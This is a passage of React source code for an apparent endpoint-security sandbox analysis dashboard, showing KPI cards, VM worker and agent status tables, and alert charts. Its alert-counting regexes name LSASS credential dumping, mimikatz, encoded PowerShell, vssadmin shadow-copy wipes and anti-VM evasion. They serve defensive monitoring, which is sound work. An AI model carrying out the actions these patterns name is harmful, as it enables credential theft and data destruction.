                <div key={m.cat} style={{ background: '#07101b', border: '1px solid #16273e', borderRadius: 4, padding: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 3 }}>
                  <span style={{ fontSize: 6.5, color: '#64748b', textAlign: 'center', height: 18, overflow: 'hidden' }}>{m.cat}</span>
                  <div style={{ width: '100%', background: `${m.col}20`, border: `1px solid ${m.col}`, borderRadius: 3, padding: '4px 2px', textAlign: 'center' }}>
                    <span style={{ fontSize: 10, color: m.col, fontWeight: 800, display: 'block' }}>{m.score}</span>
                    <span style={{ fontSize: 6.5, color: '#e2e8f0', display: 'block', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{m.title}</span>
                  </div>
                </div>
              ))}
              {!mitreCols.length && <span style={{ gridColumn: '1 / -1', color: MON.muted, fontSize: 9 }}>No MITRE techniques reported.</span>}
            </div>
            <div style={{ display: 'flex', gap: 10, fontSize: 8, color: '#8ea0b8', marginTop: 8 }}>
              <span style={{ display: 'flex', alignItems: 'center', gap: 4 }}><span style={{ width: 6, height: 6, background: '#ef4444', borderRadius: 1 }} /> High (21+)</span>
              <span style={{ display: 'flex', alignItems: 'center', gap: 4 }}><span style={{ width: 6, height: 6, background: '#f97316', borderRadius: 1 }} /> Medium (11-20)</span>
              <span style={{ display: 'flex', alignItems: 'center', gap: 4 }}><span style={{ width: 6, height: 6, background: '#22c55e', borderRadius: 1 }} /> Low (1-10)</span>
            </div>
          </div>
          <span style={{ fontSize: 9, color: '#38bdf8', fontWeight: 700, cursor: 'pointer', marginTop: 6 }}>View full ATT&CK matrix →</span>
        </div>

        {/* Behavior Summary */}
        <div style={{ ...panelStyle, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
          <div>
            <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0', letterSpacing: '0.5px', marginBottom: 8, display: 'block' }}>BEHAVIOR SUMMARY</span>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 5 }}>
              {behaviorItems.map(bi => (
                <div key={bi.label} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 8.5 }}>
                  <span style={{ color: '#cbd5e1', display: 'flex', alignItems: 'center', gap: 6 }}>
                    <span>{bi.icon}</span> {bi.label}
                  </span>
                  <span style={{ color: '#fff', fontWeight: 800 }}>{bi.val}</span>
                </div>
              ))}
            </div>
          </div>
          <span style={{ fontSize: 9, color: '#38bdf8', fontWeight: 700, cursor: 'pointer', marginTop: 6 }}>View full behavior report →</span>
        </div>

        <div style={panelStyle}>
          <ThreatSeverityDistributionBars alerts={alerts} />
        </div>
      </div>

      {/* 5. BOTTOM LIVE TICKER BAR */}
      <div style={{ background: '#0b1626', border: '1px solid #16273e', borderRadius: 8, padding: '6px 12px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontSize: 8.5 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <div style={{ background: '#ef4444', color: '#fff', fontWeight: 800, padding: '2px 8px', borderRadius: 4, fontSize: 8, letterSpacing: '0.5px' }}>
            LIVE ALERTS
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 16, color: '#cbd5e1' }}>
            {alerts.slice(0, 4).map(row => <span key={recordId(row)}><span style={{ color: '#64748b' }}>{alertTime(row) ? new Date(alertTime(row)).toLocaleTimeString() : 'No time'}</span> <span style={{ color: SEV_COLOR[alertSeverity(row)] }}>●</span> {sandboxVerdict(row)}: {sandboxFilename(row)}</span>)}
            {!alerts.length && <span style={{ color: MON.muted }}>No sandbox events reported.</span>}
          </div>
        </div>
        <span style={{ color: '#38bdf8', fontWeight: 700, cursor: 'pointer' }}>View all alerts →</span>
      </div>
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 3. MAIN DASHBOARD COMPONENT (`SandboxAnalysisDashboardPanel` / `SandboxAnalysisDashboard`)
// ═════════════════════════════════════════════════════════════════════════════
export function SandboxAnalysisDashboardPanel({ alerts = [], loading = false, total = 0, recordsTotal = 0, systems = [], data = null, onAction, onRefresh }) {
  const [activeTab, setActiveTab] = useState('monitoring');
  const [backendSystems, setBackendSystems] = useState(systems);
  const [showUploadModal, setShowUploadModal] = useState(false);

  useEffect(() => {
    if (systems.length) { setBackendSystems(systems); return; }
    let active = true;
    api.get('/system', { skipCache: true })
      .then(r => {
        if (!active) return;
        const rows = r.data?.systems || r.data?.agents || r.data || [];
        setBackendSystems(Array.isArray(rows) ? rows : []);
      })
      .catch(() => { if (active) setBackendSystems([]); });
    return () => { active = false; };
  }, [systems]);

  const rows = Array.isArray(data?.events) ? data.events : (Array.isArray(alerts) ? alerts : []);
  const totalRows = total || recordsTotal || rows.length;
  const summary = data?.summary || {};
  const sevCounts = rows.reduce((acc, row) => {
    const sev = alertSeverity(row);
    acc[sev] = (acc[sev] || 0) + 1;
    return acc;
  }, {});
  const osCounts = rows.reduce((acc, row) => {
    const os = processOs(row);
    acc[os] = (acc[os] || 0) + 1;
    return acc;
  }, {});

  const timeline = buildBuckets(rows, 8, 24);
  const eventText = row => `${row?.verdict || ''} ${row?.malwareFamily || ''} ${row?.ruleId || ''} ${row?.description || ''} ${row?.processName || ''} ${row?.fileType || ''}`.toLowerCase();
  const countText = pattern => rows.filter(row => pattern.test(eventText(row))).length;
  const riskSamples = rows.map(sandboxRiskScore).filter(Number.isFinite);
  const averageRisk = riskSamples.length
    ? `${Math.round(riskSamples.reduce((sum, value) => sum + value, 0) / riskSamples.length)}/100`
    : 'Not reported';
  const sandboxWorkers = rows
    .filter(row => row.workerId || row.sandboxWorker || row.vmId)
    .slice(0, 20)
    .map(row => ({
      id: row.workerId || row.sandboxWorker || row.vmId,
      os: row.sandboxOs || row.targetOs || row.os || 'Not reported',
      status: row.workerStatus || row.analysisStatus || alertStatus(row),
      sample: sandboxFilename(row),
      timer: Number.isFinite(Number(row.durationSeconds)) ? `${Number(row.durationSeconds)}s` : 'Not reported',
      color: /fail|error/i.test(String(row.workerStatus || row.analysisStatus || '')) ? MON.red : /run|execut|analy/i.test(String(row.workerStatus || row.analysisStatus || '')) ? MON.orange : MON.cyan,
    }));
  const fileTypeBreakdown = topCounts(rows, row => String(row.fileType || sandboxFilename(row).split('.').pop() || 'unknown').toUpperCase(), 4);
  const threatBreakdown = [
    ['Anti-VM / Sleep Bypass', countText(/anti.vm|sleep bypass|sandbox evasion/), MON.red],
    ['Process Hollowing Injection', countText(/process hollow|injection/), MON.orange],
    ['LSASS Memory Dump Attempts', countText(/lsass|credential dump|mimikatz/), MON.yellow],
    ['Clean Executions', rows.filter(row => sandboxVerdict(row) === 'clean').length, MON.green],
  ];

  // 20 Sandbox Analysis Specific SOC Categories & Metrics
  const kpis = [
    { label: '🛡️ 1. Total Sandbox Analysis Events', val: shortNum(totalRows), trend: 'Analyzed', color: MON.blue, data: timeline },
    { label: '🚨 2. Quarantined Samples', val: shortNum(rows.filter(r => /quarant/i.test(String(r.status || r.action || r.description || ''))).length), trend: 'Quarantined', color: MON.red, data: timeline },
    { label: '🛑 3. Blocked Executables', val: shortNum(rows.filter(r => /block/i.test(String(r.status || r.action || r.description || ''))).length), trend: 'Blocked', color: MON.red, data: timeline },
    { label: '🎣 4. Phishing & RAT Executables', val: shortNum(countText(/phish|\brat\b|remote access trojan/)), trend: 'RAT Exec', color: MON.orange, data: timeline },
    { label: '🌳 5. Malicious Process Trees Spawned', val: shortNum(rows.filter(row => row?.processTree || row?.childProcesses?.length || /process tree|child process/.test(eventText(row))).length), trend: 'Proc Tree', color: MON.orange, data: timeline },
    { label: '🧠 6. LSASS Credential Dumping Access', val: shortNum(countText(/lsass|credential dump|mimikatz/)), trend: 'LSASS Dump', color: MON.red, data: timeline },
    { label: '🕵️ 7. Anti-VM Evasion Attacks', val: shortNum(countText(/anti.vm|vm evasion|sandbox evasion/)), trend: 'Anti-VM', color: MON.orange, data: timeline },
    { label: '✍️ 8. Unsigned / Spoofed Executables', val: shortNum(countText(/unsigned|spoofed|invalid signature/)), trend: 'Unsigned PE', color: MON.yellow, data: timeline },
    { label: '🦠 9. YARA & VirusTotal Matches', val: shortNum(countText(/yara|virustotal|\bvt\b/)), trend: 'TI Match', color: MON.cyan, data: timeline },
    { label: '🌐 10. Suspicious C2 URLs Extracted', val: shortNum(countText(/c2|command.{0,5}control|suspicious url|beacon/)), trend: 'C2 Extracted', color: MON.cyan, data: timeline },
    { label: '🖥️ 11. Targeted Enterprise Endpoints', val: shortNum(backendSystems.length), trend: 'Target Host', color: MON.cyan, data: timeline },
    { label: '📊 12. Average Threat Risk Score', val: averageRisk, trend: 'Threat Score', color: MON.green, data: timeline },
    { label: '🚨 13. Critical Sandbox Alerts', val: shortNum(sevCounts.critical || 0), trend: 'Critical Risk', color: MON.red, data: timeline },
    { label: '💻 14. Reported Detonation VM Workers', val: shortNum(new Set(sandboxWorkers.map(worker => worker.id)).size), trend: 'VM Workers', color: MON.cyan, data: timeline },
    { label: '📦 15. PE32 / ELF Executable Ingests', val: shortNum(countText(/pe32|\belf\b|\.exe\b|executable/)), trend: 'PE/ELF Ingest', color: MON.blue, data: timeline },
    { label: '🪟 16. Windows VM Detonation Evidence', val: shortNum(sandboxWorkers.filter(worker => /windows|win\s/i.test(worker.os)).length), trend: 'Win Detonate', color: MON.cyan, data: timeline },
    { label: '🐧 17. Linux VM Detonation Evidence', val: shortNum(sandboxWorkers.filter(worker => /linux|ubuntu|debian|centos|kali/i.test(worker.os)).length), trend: 'Linux Detonate', color: MON.orange, data: timeline },
    { label: '📜 18. Encoded PowerShell Payload Executions', val: shortNum(countText(/powershell.*(?:encoded|base64)|(?:encoded|base64).*powershell/)), trend: 'PS1 Encoded', color: MON.purple, data: timeline },
    { label: '🔐 19. Ransomware Shadow Copy Wipes', val: shortNum(countText(/vssadmin|shadow copy|shadowcopy|recovery delete/)), trend: 'VSS Wipe', color: MON.red, data: timeline },
    { label: '⚠️ 20. High Severity Detonation Signals', val: shortNum(sevCounts.high || 0), trend: 'High Risk', color: MON.orange, data: timeline },
  ];

  const agentStatusRows = backendSystems.filter(sys => sys.agentVersion || sys.installDate || sys.lastSeen).map(sys => {
    const host = sys.hostname || sys.name || 'unknown';
    const hostEvents = rows.filter(r => normHost(alertHost(r)) === normHost(host)).length;
    const threats = rows.filter(r => normHost(alertHost(r)) === normHost(host) && ['medium', 'high', 'critical'].includes(alertSeverity(r))).length;
    const online = typeof sys.isOnline === 'boolean'
      ? sys.isOnline
      : Boolean(sys.agentOk || /active|online|reporting/i.test(String(sys.status || '')));
    const vmState = sys.sandboxVmStatus?.state;
    const vmCount = Number(sys.sandboxVmCount ?? sys.sandboxVmStatus?.vmCount) || 0;
    const sandboxStatus = !online
      ? 'agent offline'
      : sys.sandboxVmRunning === true || vmState === 'running'
        ? `vm running (${Math.max(1, vmCount)})`
        : vmState === 'idle'
          ? 'vm not running'
          : vmState === 'unavailable'
            ? 'detection unavailable'
            : 'not reported';
    return ({
      key: sys._id || sys.name,
      name: sys.name || sys.hostname || 'unknown',
      hostname: host,
      status: sandboxStatus,
      monitor: sandboxStatus.startsWith('vm running'),
      vmProviders: Array.isArray(sys.sandboxVmStatus?.providers) ? sys.sandboxVmStatus.providers : [],
      events: hostEvents,
      threats,
      platform: processOs(sys),
      lastSeen: sys.lastSeen || sys.lastHeartbeat || null,
    });
  });

  return (
    <div style={{ background: MON.bg, color: MON.text, display: 'flex', height: '100%', minHeight: 0, overflow: 'hidden' }}>
      {/* Sidebar Navigation */}
      <aside style={{ width: 235, flexShrink: 0, background: MON.card2, borderRight: `1px solid ${MON.border}`, padding: 14, display: 'flex', flexDirection: 'column', gap: 8 }}>
        {[
          { id: 'dashboard', icon: '📊', label: 'Dashboard', activeColor: MON.blue },
          { id: 'monitoring', icon: '📊', label: 'Monitoring', activeColor: MON.cyan },
          { id: 'log-monitor', icon: '📜', label: 'Logs (SIEM Table)', activeColor: MON.cyan },
          { id: 'reports', icon: '📄', label: 'Reports', activeColor: MON.purple },
        ].map(item => {
          const selected = activeTab === item.id;
          return (
            <button
              key={item.id}
              type="button"
              onClick={() => setActiveTab(item.id)}
              style={{
                width: '100%', display: 'flex', alignItems: 'center', gap: 10,
                background: selected ? item.activeColor : 'transparent',
                color: selected ? (item.id === 'reports' ? '#fff' : '#000') : MON.text,
                border: selected ? `1px solid ${item.activeColor}` : '1px solid transparent',
                padding: '10px 12px', borderRadius: 7, fontSize: 12, fontWeight: 800,
                textAlign: 'left', cursor: 'pointer',
              }}
            >
              <span>{item.icon}</span>
              <span>{item.label}</span>
            </button>
          );
        })}

        <button
          type="button"
          onClick={() => setShowUploadModal(true)}
          style={{
            marginTop: 'auto',
            background: MON.cyan,
            color: '#041220',
            border: 'none',
            padding: '10px 12px',
            borderRadius: 7,
            fontSize: 11,
            fontWeight: 900,
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justify: 'center',
            gap: 6,
          }}
        >
          <span>📤</span> Submit Sample
        </button>
      </aside>

      {/* Main Container */}
      <main style={{ flex: 1, minWidth: 0, padding: 16, display: 'flex', flexDirection: 'column', gap: 16, overflowY: 'auto' }}>
        {activeTab === 'vmworkers' ? (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div>
                <h3 style={{ margin: 0, fontSize: 14, color: MON.cyan, fontWeight: 900 }}>💻 Active Isolated VM Detonation Workers</h3>
                <div style={{ fontSize: 11, color: MON.muted, marginTop: 2 }}>{sandboxWorkers.length ? `${sandboxWorkers.length} worker records reported by the sandbox integration` : 'No sandbox worker health telemetry reported'}</div>
              </div>
              <button type="button" onClick={() => setShowUploadModal(true)} style={{ padding: '8px 16px', background: MON.cyan, border: 'none', color: '#041220', fontWeight: 900, borderRadius: 6, cursor: 'pointer', fontSize: 11 }}>
                📤 Submit Sample to Sandbox Engine
              </button>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 12 }}>
              {sandboxWorkers.map(vm => (
                <div key={vm.id} style={{ background: MON.card, border: `1px solid ${vm.color}44`, borderRadius: 8, padding: 14 }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontSize: 13, fontWeight: 900, color: MON.text }}>{vm.id}</span>
                    <span style={{ fontSize: 9, padding: '2px 6px', borderRadius: 4, background: `${vm.color}20`, color: vm.color, fontWeight: 900 }}>{vm.status}</span>
                  </div>
                  <div style={{ fontSize: 11, color: MON.muted, marginTop: 6 }}>OS Target: <b>{vm.os}</b></div>
                  <div style={{ fontSize: 11, color: MON.cyan, marginTop: 4 }}>Active Sample: <b>{vm.sample}</b></div>
                  <div style={{ fontSize: 10, color: MON.sub, marginTop: 2 }}>Execution Timer: {vm.timer}</div>
                </div>
              ))}
            </div>
          </div>
        ) : activeTab === 'log-monitor' ? (
          <CapabilityLogsPanel capabilityId={18}>
            <SandboxLogMonitor alerts={rows} onAction={onAction} />
          </CapabilityLogsPanel>
        ) : activeTab === 'reports' ? (
          <CapabilityReportsPanel capabilityId={18} alerts={rows} />
        ) : activeTab === 'dashboard' ? (
          <SandboxOverviewDashboard alerts={rows} total={totalRows} summary={summary} />
        ) : (
          <>
            {/* 20 Top KPI Cards Grid */}
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 12 }}>
              {kpis.map((kpi, i) => (
                <div key={i} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 12, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                    <div style={{ fontSize: 11, fontWeight: 700, color: MON.muted }}>{kpi.label}</div>
                    <span style={{ fontSize: 9, fontWeight: 800, color: MON.green, background: 'rgba(0,0,0,0.3)', padding: '2px 6px', borderRadius: 4 }}>{kpi.trend}</span>
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', marginTop: 10 }}>
                    <div style={{ fontSize: 22, fontWeight: 900, color: kpi.color }}>{kpi.val}</div>
                    <div style={{ width: 70 }}><MiniSparkline data={kpi.data} color={kpi.color} height={24} /></div>
                  </div>
                </div>
              ))}
            </div>

            {/* Agent Level Table */}
            <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, overflow: 'hidden' }}>
              <div style={{ padding: '11px 14px', borderBottom: `1px solid ${MON.line}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div style={{ fontSize: 12, fontWeight: 900, color: '#fff' }}>🛰 AJNAT Agent — Running VM Status</div>
                <div style={{ fontSize: 9, color: MON.green }}>● {agentStatusRows.filter(row => row.monitor).length}/{agentStatusRows.length} installed endpoints currently running a VM</div>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 110px 90px 90px 130px', gap: 8, padding: '9px 12px', background: MON.card2, color: MON.muted, fontSize: 9, fontWeight: 800 }}>
                <span>Agent Name</span><span>Hostname</span><span>Platform Type</span><span>VM Status</span><span>Signals</span><span>Threats</span><span>Last Heartbeat</span>
              </div>
              {agentStatusRows.map(row => (
                <div key={row.key} style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 110px 90px 90px 130px', gap: 8, padding: '10px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10, alignItems: 'center' }}>
                  <b style={{ color: MON.cyan }}>{row.name}</b><span>{row.hostname}</span>
                  <span style={{ color: MON.text }}>{row.platform}</span>
                  <b title={row.vmProviders.join(', ') || 'No VM provider reported'} style={{ color: row.monitor ? MON.green : row.status === 'vm not running' ? MON.cyan : MON.muted, textTransform: 'uppercase' }}>{row.status}</b>
                  <b>{row.events}</b>
                  <b style={{ color: row.threats > 0 ? MON.red : MON.green }}>{row.threats}</b>
                  <span style={{ color: MON.sub }}>{row.lastSeen ? new Date(row.lastSeen).toLocaleTimeString() : 'Not reported'}</span>
                </div>
              ))}
              {!agentStatusRows.length && (
                <div style={{ padding: 18, textAlign: 'center', color: MON.muted, fontSize: 11 }}>
                  No installed AJNAT agent has reported VM status yet.
                </div>
              )}
            </div>

            {/* 3 Bottom Analytics Charts */}
            <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr 1fr', gap: 14 }}>
              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>📈 Sandbox Ingestion & Detonation Timeline (24 Hours)</div>
                <div style={{ height: 140, display: 'flex', alignItems: 'flex-end', gap: 8, borderBottom: `1px solid ${MON.line}` }}>
                  {buildBuckets(rows, 15, 24).map((val, idx, arr) => (
                    <div key={idx} title={`${val} sample detonations`} style={{ flex: 1, height: `${Math.max(4, (val / Math.max(...arr, 1)) * 100)}%`, background: MON.cyan, borderRadius: '2px 2px 0 0' }} />
                  ))}
                </div>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>🚨 Top Malicious Attachment & File Types</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 11 }}>
                  {fileTypeBreakdown.map(([att, count], index) => (
                    <div key={att} style={{ display: 'flex', justifyContent: 'space-between' }}>
                      <span style={{ color: MON.text, fontWeight: 700 }}>{att}</span>
                      <span style={{ color: [MON.red, MON.orange, MON.yellow, MON.cyan][index], fontWeight: 800 }}>{count} Files</span>
                    </div>
                  ))}
                  {!fileTypeBreakdown.length && <span style={{ color: MON.muted }}>No file-type telemetry reported.</span>}
                </div>
              </div>

              <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 14 }}>
                <div style={{ fontSize: 12, fontWeight: 800, color: '#fff', marginBottom: 12 }}>🔑 Sandbox Evasion & Threat Breakdown</div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 11 }}>
                  {threatBreakdown.map(([ev, count, col]) => (
                    <div key={ev} style={{ display: 'flex', justifyContent: 'space-between' }}>
                      <span style={{ color: MON.muted }}>{ev}</span>
                      <span style={{ color: col, fontWeight: 800 }}>{count}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </>
        )}
      </main>

      {/* Upload Modal */}
      {showUploadModal && (
        <SandboxUploadModal
          onClose={() => setShowUploadModal(false)}
          onSubmitSuccess={() => onRefresh?.()}
        />
      )}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 4. OVERLAY CAPABILITY MODAL EXPORT (`SandboxAnalysisPage` & `CapabilityPage`)
// ═════════════════════════════════════════════════════════════════════════════
export default function SandboxAnalysisPage() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { company, user } = useAuth();
  const fromDashboard = searchParams.get('from') === 'dashboard';
  const capabilityId = searchParams.get('capabilityId') || '18';
  const companyId = company?._id || user?.companyId?._id || user?.companyId;

  const [alerts, setAlerts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [total, setTotal] = useState(0);
  const [systems, setSystems] = useState([]);

  const loadAlerts = useCallback(async (quiet = false) => {
    if (!quiet) setLoading(true);
    try {
      const q = new URLSearchParams({
        page: 1,
        limit: 1000,
        capabilityId,
        capability: 'sandbox-analysis',
        windowHours: 24,
      });
      const r = await api.get(`/dashboard/alerts/edr?${q}`);
      const next = r.data?.alerts || [];
      setAlerts(next);
      setTotal(r.data?.total || next.length);
    } catch {
      setAlerts([]);
    } finally {
      if (!quiet) setLoading(false);
    }
  }, [capabilityId]);

  const loadSystems = useCallback(async () => {
    try {
      const r = await api.get('/system', { skipCache: true });
      setSystems(Array.isArray(r.data?.systems || r.data) ? (r.data?.systems || r.data) : []);
    } catch {
      setSystems([]);
    }
  }, []);

  useEffect(() => {
    loadAlerts(false);
    loadSystems();
    const interval = setInterval(() => { loadAlerts(true); loadSystems(); }, 15000);
    return () => clearInterval(interval);
  }, [loadAlerts, loadSystems]);

  useEffect(() => {
    const socket = io(SOCKET_URL, { ...socketOptions, transports: ['polling', 'websocket'] });
    const join = () => { if (companyId) socket.emit('join:company', companyId); };
    const buf = createEventBuffer(() => loadAlerts(true), 1200);
    const vmBuf = createEventBuffer(() => loadSystems(), 300);
    socket.on('connect', join);
    socket.on('alert:new', buf.add);
    socket.on('sandbox:event', buf.add);
    socket.on('sandbox:vm-status', vmBuf.add);
    join();
    const disc = connectSocket(socket);
    return () => {
      socket.off('connect', join);
      socket.off('alert:new', buf.add);
      socket.off('sandbox:event', buf.add);
      socket.off('sandbox:vm-status', vmBuf.add);
      buf.clear();
      vmBuf.clear();
      disc();
    };
  }, [companyId, loadAlerts, loadSystems]);

  const handleClose = () => navigate(fromDashboard ? '/' : '/edr', { replace: true });

  return (
    <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,.75)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 1000 }} onClick={e => { if (e.target === e.currentTarget) handleClose(); }}>
      <div style={{ background: '#0c1a2e', border: '1px solid #1e3a5f', borderRadius: 12, width: 'calc(100vw - 8px)', height: 'calc(100vh - 8px)', display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 18px', borderBottom: '1px solid #1e3a5f', flexShrink: 0 }}>
          <h3 style={{ margin: 0, fontSize: 15, color: '#e0f2fe' }}>
            🛡️ 18. Sandbox Analysis Engine
            <span style={{ marginLeft: 10, color: MON.cyan, fontWeight: 900 }}>
              — {Number(total || 0).toLocaleString()} logs
            </span>
          </h3>
          <button type="button" onClick={handleClose} style={{ background: 'none', border: 'none', color: '#60a5fa', fontSize: 20, cursor: 'pointer' }}>✕</button>
        </div>
        <SandboxAnalysisDashboardPanel alerts={alerts} loading={loading} total={total} systems={systems} onRefresh={() => loadAlerts(false)} />
      </div>
    </div>
  );
}

export function CapabilityPage() {
  return <SandboxAnalysisPage />;
}

export function SandboxAnalysisSocTabPage({ tab }) {
  return <SandboxAnalysisDashboardPanel alerts={[]} />;
}

// ═════════════════════════════════════════════════════════════════════════════
// 5. SUB-TAB PAGE ROUTE & EXPORTS FOR ROUTING
// ═════════════════════════════════════════════════════════════════════════════
export function SandboxAnalysisSubTabPage() {
  const navigate = useNavigate();
  const { tab = 'overview' } = useParams();

  if (tab === 'overview') return <Navigate to="/company-admin/edr?capabilityId=18" replace />;

  return (
    <div style={{ height: '100vh', overflow: 'hidden', background: MON.bg, display: 'grid', gridTemplateRows: '54px 1fr', color: '#e5edf7' }}>
      <header style={{ borderBottom: `1px solid ${MON.line}`, background: MON.card, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 28px' }}>
        <h3 style={{ margin: 0, fontSize: 14, color: MON.blue }}>Sandbox SubTab — {tab}</h3>
        <button type="button" onClick={() => navigate('/company-admin/edr?capabilityId=18')} style={{ border: 0, background: 'transparent', color: '#60a5fa', fontSize: 26, cursor: 'pointer' }}>×</button>
      </header>
      <div style={{ display: 'grid', gridTemplateColumns: '196px minmax(0, 1fr)', overflow: 'hidden' }}>
        <ProcessSidebar kind="sandboxanalysis" activeKey={tab} />
        <main style={{ overflow: 'auto', background: MON.bg, padding: 16 }}>
          <SandboxAnalysisDashboardPanel />
        </main>
      </div>
    </div>
  );
}

// ── Alias export for backward compatibility ──
export { SandboxAnalysisDashboardPanel as SandboxAnalysisDashboard };
